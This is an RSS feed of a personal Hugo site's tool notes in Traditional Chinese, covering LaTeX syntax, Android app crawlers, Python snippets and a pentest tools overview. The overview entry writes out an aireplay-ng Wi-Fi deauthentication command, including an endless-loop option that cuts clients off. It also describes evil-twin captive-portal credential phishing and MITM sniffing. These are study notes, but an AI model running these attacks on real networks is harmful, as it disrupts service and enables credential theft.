<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tools on SBK Hugo Site</title><link>https://bernie6401.github.io/tools/</link><description>Recent content in Tools on SBK Hugo Site</description><generator>Hugo</generator><language>en-us</language><atom:link href="https://bernie6401.github.io/tools/index.xml" rel="self" type="application/rss+xml"/><item><title/><link>https://bernie6401.github.io/tools/ctf/all-pentest-tools/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/ctf/all-pentest-tools/</guid><description>&lt;h1 id="all-pentest-tools">
 All Pentest Tools
 &lt;a class="anchor" href="#all-pentest-tools">#&lt;/a>
&lt;/h1>
&lt;p>可以參考以下論文，裡面有詳細說明Vulnerability Assessment and Penetration Testing (VAPT)會使用到的工具有哪些
:::info
Ravindran, U., &amp;amp; Potukuchi, R. V. (2022). A Review on Web Application Vulnerability Assessment and Penetration Testing. Review of Computer Engineering Studies, 9(1).
:::&lt;/p>
&lt;h1 id="wireless-related">
 Wireless Related
 &lt;a class="anchor" href="#wireless-related">#&lt;/a>
&lt;/h1>
&lt;ul>
&lt;li>大部分都會用到&lt;a href="https://sectools.tw/aircrack-ng-%E6%95%99%E5%AD%B8/">Aircrack&lt;/a>這個工具&lt;/li>
&lt;li>Deauthentication - &lt;a href="http://atic-tw.blogspot.com/2014/01/airodump-ng.html">airodump-ng教學&lt;/a> / &lt;a href="http://atic-tw.blogspot.com/2014/01/aireplay-ng6.html">aireplay-ng教學&lt;/a>
攻擊說明: &lt;a href="https://ithelp.ithome.com.tw/articles/10218551?sc=rss.iron">[Day 05]資安百物語：第二談：現代飛頭蠻的反制法-反無人機技術(下) &lt;/a>
&lt;ol>
&lt;li>Scan
將掃描範圍縮小到一個目標，並取得連接到目標網路的裝置的MAC位址。
&lt;pre tabindex="0">&lt;code>$ airodump-ng -bSSID &amp;lt;bssid&amp;gt; --ch &amp;lt;channels&amp;gt; WLAN0mon
# 此命令用於通過識別 BSSID（基本服務集識別符）和所使用的通道來設置目標網路上的掃描
# -c: 指定只接收特定的 channels，如果有多個 channel，用 , 分隔，例如：-c 6,8,10,11
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>Attack
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ aireplay-ng --deauth &amp;lt;count, e.g. 1000&amp;gt; -a &amp;lt;bssid, e.g. 6A:BF:C4:06:35:94&amp;gt; -c &amp;lt;AP MAC address, e.g 34:CF:F6:96:72:E2&amp;gt; wlan0mon
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -c dmac : 指定 Client 的 MAC address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># -a bssid : 指定 AP 的 MAC address&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># --deauth: count 是指執行阻斷的次數，如果設為 0 表循環攻擊，Client 將無法上網。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>Fluxion
攻擊說明與工具教學: &lt;a href="https://www.cnblogs.com/xuanhun/p/5783836.html">實戰-Fluxion與wifi熱點偽造、釣魚、中間人攻擊、wifi破解&lt;/a>，Fluxion 攻擊的主要目標是獲取目標 Wi-Fi 網路使用者使用的密碼或訪問憑據。此攻擊可使攻擊者未經授權訪問目標網路，而有關於Captive Portal(WEB Portal)的驗證流程可以參考&lt;a href="https://ithelp.ithome.com.tw/articles/10280421">這篇&lt;/a>
&lt;ol>
&lt;li>Captive Portal Attack
根據前面的background可以知道web portal的驗證流程，那如果把原本的hotspot換成一個假的hotspot，讓使用者誤以為這是真的驗證頁面(需要帳號密碼之類的)，那我們就有機會拿到credentials session&lt;/li>
&lt;li>直接取得SSID/BSSID/Channel Used/Password Used/Type of Security Applied&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>MITM - &lt;a href="https://blog.csdn.net/chinabyxl/article/details/121463891">Xerosploit教學&lt;/a>
Sniff模組允許攻擊者監控通過目標Wi-Fi網路的數據流量，包括使用者發送的數據。通過監視此類流量，攻擊者可以竊取身份驗證憑據、個人資訊或其他敏感數據等資訊，sniff完了以後可以用wireshark打開看流量&lt;/li>
&lt;li>WEP/WPA Attack
WEP/WPA 注入攻擊是針對使用 WEP/WPA 安全協定的無線網路的針對性攻擊。此攻擊旨在滲透網路安全並獲得對透過網路傳輸的資料流量的未經授權的存取。一旦收集到加密的流量數據，攻擊者就可以分析該數據的模式和結構，以識別網路中使用的加密金鑰。透過取得加密金鑰，攻擊者可以破解透過網路發送的資料流量的加密。
&lt;ol>
&lt;li>Handshake on the target Wi-Fi network&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>DoS - Aircrack的Wi-Fi DoS攻擊&lt;/li>
&lt;/ul>
&lt;h1 id="web-related">
 Web Related
 &lt;a class="anchor" href="#web-related">#&lt;/a>
&lt;/h1>
&lt;p>以下分類是按照OWASP的Pentest框架順序分類&lt;/p></description></item><item><title>$\LaTeX$ 語法筆記</title><link>https://bernie6401.github.io/tools/others/_latex-%E8%AA%9E%E6%B3%95%E7%AD%86%E8%A8%98/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/_latex-%E8%AA%9E%E6%B3%95%E7%AD%86%E8%A8%98/</guid><description>&lt;blockquote>
&lt;p>HackMD 是透過 MathJax 支援 $\LaTeX$ ，雖未支援所有語法，對多數人應已足夠，一起把 Web 上醜死的公式換成美美的吧～&lt;/p>&lt;/blockquote>
&lt;h1 id="latex-語法筆記">
 $\LaTeX$ 語法筆記
 &lt;a class="anchor" href="#latex-%e8%aa%9e%e6%b3%95%e7%ad%86%e8%a8%98">#&lt;/a>
&lt;/h1>
&lt;p>$$
\LaTeX % 大小寫須正確
$$&lt;/p>
&lt;pre tabindex="0">&lt;code>\LaTeX % 大小寫須正確

$\textstyle$
$$\displaystyle$$
%comment
&lt;/code>&lt;/pre>&lt;p>$$
\grave apple % 標重音
$$&lt;/p>
&lt;pre tabindex="0">&lt;code>\grave apple % 標重音
&lt;/code>&lt;/pre>&lt;p>$$
{\bf AB} % 粗體 boldface
$$&lt;/p>
&lt;pre tabindex="0">&lt;code>{\bf AB} % 粗體 boldface
&lt;/code>&lt;/pre>&lt;p>$$
\bar{A}
$$&lt;/p>
&lt;pre tabindex="0">&lt;code>\bar{A}
&lt;/code>&lt;/pre>&lt;p>$$
{ a+b \brace c+d }
$$&lt;/p>
&lt;pre tabindex="0">&lt;code>{ a+b \brace c+d }
&lt;/code>&lt;/pre>&lt;p>$$
\overline{AB}
$$&lt;/p>
&lt;pre tabindex="0">&lt;code>\overline{AB}
&lt;/code>&lt;/pre>&lt;p>$$
\vec{v}
$$&lt;/p>
&lt;pre tabindex="0">&lt;code>\vec{v}
&lt;/code>&lt;/pre>&lt;p>$$
\frac{b}{a}
$$&lt;/p>
&lt;pre tabindex="0">&lt;code>\frac{b}{a}
% 或
{b \over a}
&lt;/code>&lt;/pre>&lt;p>$$
\dfrac{b}{a}
$$&lt;/p></description></item><item><title>App Crawler Overview</title><link>https://bernie6401.github.io/tools/others/android-app-crawler/app-crawler-overview/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-app-crawler/app-crawler-overview/</guid><description>&lt;h1 id="android-app-crawler">
 Android App Crawler
 &lt;a class="anchor" href="#android-app-crawler">#&lt;/a>
&lt;/h1>
&lt;p>目前僅針對以下功能進行查找&lt;/p>
&lt;ol>
&lt;li>可以自行判斷目前activity有哪些可以interact&lt;/li>
&lt;li>自行與這些interactable的view進行interact，不管是DFS或是BFS，反正就是全部都互動就對了&lt;/li>
&lt;/ol>
&lt;h2 id="比較常見的">
 比較常見的
 &lt;a class="anchor" href="#%e6%af%94%e8%bc%83%e5%b8%b8%e8%a6%8b%e7%9a%84">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://developer.android.com/studio/test/other-testing-tools/app-crawler">App Crawler&lt;/a> &lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;sup id="fnref:2">&lt;a href="#fn:2" class="footnote-ref" role="doc-noteref">2&lt;/a>&lt;/sup>&lt;sup id="fnref:3">&lt;a href="#fn:3" class="footnote-ref" role="doc-noteref">3&lt;/a>&lt;/sup> - 無法使用&lt;/li>
&lt;li>&lt;a href="https://github.com/seveniruby/AppCrawler">seveniruby/AppCrawler&lt;/a> &lt;sup id="fnref:4">&lt;a href="#fn:4" class="footnote-ref" role="doc-noteref">4&lt;/a>&lt;/sup>&lt;sup id="fnref:5">&lt;a href="#fn:5" class="footnote-ref" role="doc-noteref">5&lt;/a>&lt;/sup>&lt;sup id="fnref:6">&lt;a href="#fn:6" class="footnote-ref" role="doc-noteref">6&lt;/a>&lt;/sup>&lt;sup id="fnref:7">&lt;a href="#fn:7" class="footnote-ref" role="doc-noteref">7&lt;/a>&lt;/sup>&lt;sup id="fnref:8">&lt;a href="#fn:8" class="footnote-ref" role="doc-noteref">8&lt;/a>&lt;/sup>&lt;sup id="fnref:9">&lt;a href="#fn:9" class="footnote-ref" role="doc-noteref">9&lt;/a>&lt;/sup> - 無法使用&lt;/li>
&lt;li>&lt;a href="https://github.com/zhangzhao4444/Maxim">zhangzhao4444/Maxim&lt;/a> - 無法使用&lt;/li>
&lt;li>&lt;a href="https://github.com/Eaway/AppCrawler">Eaway/AppCrawler&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/isonic1/Appium-Native-Crawler">isonic1/Appium-Native-Crawler&lt;/a>&lt;/li>
&lt;/ul>
&lt;h2 id="根據paper-related-work">
 根據Paper Related Work
 &lt;a class="anchor" href="#%e6%a0%b9%e6%93%9apaper-related-work">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>&lt;a href="https://github.com/tingsu/Stoat">Stoat&lt;/a>
:::info
Ting Su, Guozhu Meng, Yuting Chen, Ke Wu, Weiming Yang, Yao Yao, Geguang Pu, Yang Liu, and Zhendong Su. 2017. Guided, stochastic model-based GUI testing of Android apps. In Proceedings of the 2017 11th Joint Meeting on Foundations of Software Engineering (ESEC/FSE 2017). Association for Computing Machinery, New York, NY, USA, 245–256. &lt;a href="https://doi.org/10.1145/3106237.3106298">https://doi.org/10.1145/3106237.3106298&lt;/a>
:::
詳細的說明(包含Demo影片、比較的工具、測試的App)，都可以參考 &lt;a href="https://tingsu.github.io/files/stoat.html">https://tingsu.github.io/files/stoat.html&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://developer.android.com/studio/test/other-testing-tools/monkey">UI/Application Exerciser Monkey&lt;/a> - 不會採用
這是上一篇所比較的對象之一，可以想像成一個猴子正在對一個手機上的App進行隨機互動，可能包含簡單的click, double click, long click或是swipe等等
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ adb shell monkey -p com.music.spotify -v &lt;span style="color:#ae81ff">50000&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>最後面的數字代表隨機丟出多少的event給特定的App&lt;/li>
&lt;li>&lt;a href="https://github.com/tanzirul/a3e">a3e&lt;/a> - 年代久遠不採用
也是第一篇的比較對象之一&lt;/li>
&lt;li>&lt;a href="https://github.com/Rhapsod/sapienz">Sapienz&lt;/a> - 無法使用
也是第一篇的比較對象之一&lt;/li>
&lt;li>&lt;a href="http://gutianxiao.com/ape/">APE - official webpage&lt;/a> / &lt;a href="https://github.com/tianxiaogu/ape">APE - github&lt;/a> - github star太少且年代久遠不採用
這是第一篇有提到的工具之一&lt;/li>
&lt;li>&lt;a href="https://github.com/bytedance/Fastbot_Android">Fastbot Android&lt;/a> - 可採用
這是前一個APE官網有提到的工具，而且開發時間還蠻近的，github star也很多，也有&lt;a href="https://blog.csdn.net/u010698107/article/details/127347704">CSDN教學&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/honeynet/droidbot">Droidbot&lt;/a> - 可能採用
:::info
Li, Y., Yang, Z., Guo, Y., &amp;amp; Chen, X. (2017, May). Droidbot: a lightweight ui-guided test input generator for android. In 2017 IEEE/ACM 39th International Conference on Software Engineering Companion (ICSE-C) (pp. 23-26). IEEE.
:::
年代有點久遠，但網路上的&lt;a href="https://juejin.cn/post/7316582773434204171">教學&lt;/a>也蠻多的，官網也有提供&lt;a href="http://honeynet.github.io/droidbot/report_com.yelp.android/">範例&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/google-deepmind/android_env">Androidenv&lt;/a> - 可能採用
:::info
Toyama, D., Hamel, P., Gergely, A., Comanici, G., Glaese, A., Ahmed, Z., &amp;hellip; &amp;amp; Precup, D. (2021). Androidenv: A reinforcement learning platform for android. arXiv preprint arXiv:2105.13231.
:::
年代較近，也有教學&lt;/li>
&lt;/ol>
&lt;h2 id="實驗的來源以及標準">
 實驗的來源以及標準
 &lt;a class="anchor" href="#%e5%af%a6%e9%a9%97%e7%9a%84%e4%be%86%e6%ba%90%e4%bb%a5%e5%8f%8a%e6%a8%99%e6%ba%96">#&lt;/a>
&lt;/h2>
&lt;p>如果僅僅是要app本身是開源的可以從&lt;a href="https://f-droid.org/zh_Hant/">F-Droid&lt;/a>當中去找，這個網站就是一個免費的Google Play Store，但是我要找的除了是app本身開源，後端本身也要開源，k因為這樣我才知道後端的URL有多少，如果想要知道有哪些可能可以拿來實驗的App，可以看&lt;code>Guided, stochastic model-based GUI testing of Android apps.&lt;/code>這一篇論文(就是前面提到的第一篇)&lt;/p></description></item><item><title>App Crawler 無法使用紀錄</title><link>https://bernie6401.github.io/tools/others/android-app-crawler/app-crawler-%E7%84%A1%E6%B3%95%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-app-crawler/app-crawler-%E7%84%A1%E6%B3%95%E4%BD%BF%E7%94%A8%E7%B4%80%E9%8C%84/</guid><description>&lt;h1 id="app-crawler-無法使用紀錄">
 App Crawler 無法使用紀錄
 &lt;a class="anchor" href="#app-crawler-%e7%84%a1%e6%b3%95%e4%bd%bf%e7%94%a8%e7%b4%80%e9%8c%84">#&lt;/a>
&lt;/h1>
&lt;p>根據&lt;a href="https://developer.android.com/studio/test/other-testing-tools/app-crawler">Android Studio官網&lt;/a>的說明&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ java -jar crawl_launcher.jar --apk-file path/to/my/app.apk --android-sdk path/to/my/android/sdk
&lt;/code>&lt;/pre>&lt;p>我已經有安裝app在手機了，所以實際的command如下&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-bash!" data-lang="bash!">$ java -jar crawl_launcher.jar --app-package-name com.xueqiu.android --android-sdk C:\Users\Bernie\AppData\Local\Android\Sdk
Preparing to crawl com.xueqiu.android
Crawl started.
Crawl finished.
Writing logcat to D:\NTU\Paper\MITM Framework\Code\AppCrawler\Google App Crawler\crawl_output\com.xueqiu.android-logcat.txt
SUCCESS: Found 0 crashes.
Timed out waiting for crawl outputs proto file D:\NTU\Paper\MITM Framework\Code\AppCrawler\Google App Crawler\crawl_output\app_firebase_test_lab\crawl_outputs.proto
The output directory is D:\NTU\Paper\MITM Framework\Code\AppCrawler\Google App Crawler\crawl_output
&lt;/code>&lt;/pre>&lt;p>但全程就只有大約不到30秒就結束了，不太懂流程到底出錯在哪，而且就算沒有安裝app，再重新跑一次，居然還可以沒有出錯的跑完；又或者是，把在沒有安裝app的情況下，用官網的command跑會直接當掉，無法繼續往下繼續跑，就一整個就很怪，但網路上也沒有比較新的說明&lt;/p></description></item><item><title>AppCrawler</title><link>https://bernie6401.github.io/tools/others/android-app-crawler/appcrawler/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-app-crawler/appcrawler/</guid><description>&lt;h1 id="appcrawler">
 AppCrawler
 &lt;a class="anchor" href="#appcrawler">#&lt;/a>
&lt;/h1>
&lt;p>前面踩了超多坑，所以一切都以底下最新的配置為主&lt;/p>
&lt;h2 id="infra">
 Infra
 &lt;a class="anchor" href="#infra">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Appium - 1.22.3
一定要是2.0.0以下(未包含)，所以不要用default latest version，可以用CLI也可以用Desktop，因為Desktop Version預設已經no longer supported，所以一定是1.22.3，而CLI安裝就需要指定(以下是已經安裝npm為前提)
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ npm install -g appium@1.22.3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ npm install -g appium-doctor
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>設定ANDROID_HOME和JAVA_HOME
到Windows環境變數設定
&lt;img src="https://hackmd.io/_uploads/BkmODXjqR.png" alt="圖片" />
然後去看appium-doctor看necessary的部分是不是都有，一般來說可能會apkanalyzer.bat會沒有，這方面就慢慢到網路上去載android studio下載tools
&lt;img src="https://hackmd.io/_uploads/BkZsw7j9R.png" alt="圖片" />&lt;/li>
&lt;li>AppCrawler - latest (2.7.4)
就直接到github release去下載build好的jar file，不需要看其他教學是用2.4.0或是2.3.1去用stb或是maven build原本的專案
Official Link: &lt;a href="https://github.com/seveniruby/AppCrawler/releases/tag/2.7.4">https://github.com/seveniruby/AppCrawler/releases/tag/2.7.4&lt;/a>&lt;/li>
&lt;/ol>
&lt;h2 id="測試前">
 測試前
 &lt;a class="anchor" href="#%e6%b8%ac%e8%a9%a6%e5%89%8d">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>app activity name
如果已經在手機安裝好，就直接看dumpsys中該package的main activity是哪一個
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ adb shell dumpsys package com.spotify.music | grep -B &lt;span style="color:#ae81ff">2&lt;/span> &lt;span style="color:#e6db74">&amp;#34;android.intent.action.MAIN&amp;#34;&lt;/span> -n
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>279- Action: &lt;span style="color:#e6db74">&amp;#34;com.google.android.meet.ADDONS_SUPPORT&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>280- Category: &lt;span style="color:#e6db74">&amp;#34;android.intent.category.DEFAULT&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>281: android.intent.action.MAIN:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>282- 553d29 com.spotify.music/.SpotifyMainActivity filter 3a3b8ae
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>283: Action: &lt;span style="color:#e6db74">&amp;#34;android.intent.action.MAIN&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>--
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>286- Category: &lt;span style="color:#e6db74">&amp;#34;android.intent.category.APP_MUSIC&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>287- 7cd1a0c com.spotify.music/.main.AppIconEmeraldGreen filter 18bef55
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>288: Action: &lt;span style="color:#e6db74">&amp;#34;android.intent.action.MAIN&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>--
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>290- Category: &lt;span style="color:#e6db74">&amp;#34;android.intent.category.DEFAULT&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>291- c3efd6a com.spotify.music/.MainActivity filter 204625b
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>292: Action: &lt;span style="color:#e6db74">&amp;#34;android.intent.action.MAIN&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>--
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>307- android.intent.action.MUSIC_PLAYER:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>308- 553d29 com.spotify.music/.SpotifyMainActivity filter 3a3b8ae
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>309: Action: &lt;span style="color:#e6db74">&amp;#34;android.intent.action.MAIN&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>另外一種方式就是用apktool反編譯後去看AndroidManifest.xml，一樣就是string search ==android.intent.action.MAIN==，但反編譯後會有一大堆files，可能會很佔空間
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ apktool d your_app.apk
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>app package name
如果已經安裝了，就直接list package
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ adb shell pm list package | grep spotify
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>package:com.spotify.music
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>要不然就要用aapt去看
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ aapt d badging Spotify.apk | findstr package
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>package: name&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;com.spotify.music&amp;#39;&lt;/span> versionCode&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;116658084&amp;#39;&lt;/span> versionName&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;8.9.58.572&amp;#39;&lt;/span> platformBuildVersionName&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;14&amp;#39;&lt;/span> platformBuildVersionCode&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;34&amp;#39;&lt;/span> compileSdkVersion&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;34&amp;#39;&lt;/span> compileSdkVersionCodename&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;14&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>uses-permission: name&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;com.sec.android.app.clockpackage.permission.READ_ALARM&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>開啟appium
如何檢視有正確開啟並且有連線到
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ appium
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>Appium&lt;span style="color:#f92672">]&lt;/span> Welcome to Appium v1.22.3
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>Appium&lt;span style="color:#f92672">]&lt;/span> Appium REST http interface listener started on 0.0.0.0:4723
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ curl http://127.0.0.1:4723/wd/hub/status
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;value&amp;#34;&lt;/span>:&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;build&amp;#34;&lt;/span>:&lt;span style="color:#f92672">{&lt;/span>&lt;span style="color:#e6db74">&amp;#34;version&amp;#34;&lt;/span>:&lt;span style="color:#e6db74">&amp;#34;1.22.3&amp;#34;&lt;/span>&lt;span style="color:#f92672">}}&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;sessionId&amp;#34;&lt;/span>:null,&lt;span style="color:#e6db74">&amp;#34;status&amp;#34;&lt;/span>:0&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="實際測試">
 實際測試
 &lt;a class="anchor" href="#%e5%af%a6%e9%9a%9b%e6%b8%ac%e8%a9%a6">#&lt;/a>
&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ java -jar appcrawler-2.7.4-hogwarts.jar --capability &lt;span style="color:#e6db74">&amp;#34;appPackage=com.spotify.music,appActivity=MainActivity&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="注意事項">
 注意事項
 &lt;a class="anchor" href="#%e6%b3%a8%e6%84%8f%e4%ba%8b%e9%a0%85">#&lt;/a>
&lt;/h2>
&lt;p>:::danger
基本上這個tool還是依照大量截圖的方式判斷有無換頁，所以依照現在android版本的更新，開發商如果設定成無法截圖的方式，就無法做後續的測試
:::
:::danger
根據以上的步驟，還是非常有可能會遇到問題，我自己在用physical device時，最常遇到&lt;a href="https://ceshiren.com/t/topic/16293">java.lang.RuntimeException: Error creating extended parser class: Could not determine whether class ‘org.pegdown.Parser$$parboiled’ has already been loaded&lt;/a>，在使用emulator的時候，也會遇到&lt;a href="https://ceshiren.com/t/topic/31983">Exception in thread “main” java.awt.image.RasterFormatException: (y + height) is outside of Raster&lt;/a>&lt;/p></description></item><item><title>Command Cheat Sheet</title><link>https://bernie6401.github.io/tools/others/command-cheat-sheet/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/command-cheat-sheet/</guid><description>&lt;h1 id="command-cheat-sheet">
 Command Cheat Sheet
 &lt;a class="anchor" href="#command-cheat-sheet">#&lt;/a>
&lt;/h1>
&lt;h2 id="python-基本用語">
 Python 基本用語
 &lt;a class="anchor" href="#python-%e5%9f%ba%e6%9c%ac%e7%94%a8%e8%aa%9e">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>
&lt;p>Bytes $\to$ Hex&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> example_str &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\x17\x10\x06&lt;/span>&lt;span style="color:#e6db74">Ar&lt;/span>&lt;span style="color:#ae81ff">\xe4&lt;/span>&lt;span style="color:#e6db74">G&lt;/span>&lt;span style="color:#ae81ff">\xc9\xb5\xd7&lt;/span>&lt;span style="color:#e6db74">y&lt;/span>&lt;span style="color:#ae81ff">\xbc&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> example_str&lt;span style="color:#f92672">.&lt;/span>hex()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">&amp;#39;1710064172e447c9b5d779bc&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Hex $\to$ String&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> bytes&lt;span style="color:#f92672">.&lt;/span>fromhex(&lt;span style="color:#e6db74">&amp;#39;68656c6c6f&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;utf-8&amp;#39;&lt;/span>)
